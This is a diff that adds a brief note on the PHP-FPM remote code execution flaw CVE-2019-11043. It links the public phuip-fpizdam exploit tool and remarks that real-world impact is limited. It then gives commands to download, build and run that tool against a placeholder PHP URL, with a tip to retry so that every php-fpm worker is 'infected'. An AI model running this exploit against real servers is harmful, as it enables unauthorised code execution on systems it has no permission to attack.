@@ -1,0 +1,15 @@
+PHP-FPM Remote Code Execution Vulnerability (CVE-2019-11043):
+https://github.com/neex/phuip-fpizdam
+
+Note:
+  This vulnerability has limited impact in the real world. Most nginx configurations carry file inspections,
+  and a default nginx install does not include the configuration nessesary.
+
+	Download/Install:
+		go get -v github.com/neex/phuip-fpizdam
+	Build:
+		go install github.com/neex/phuip-fpizdam
+	Run:
+	  - Try multiple types in order to infect all php-fpm workers.
+
+		phuip-fpizdam http://{your_ip}/{file}.php
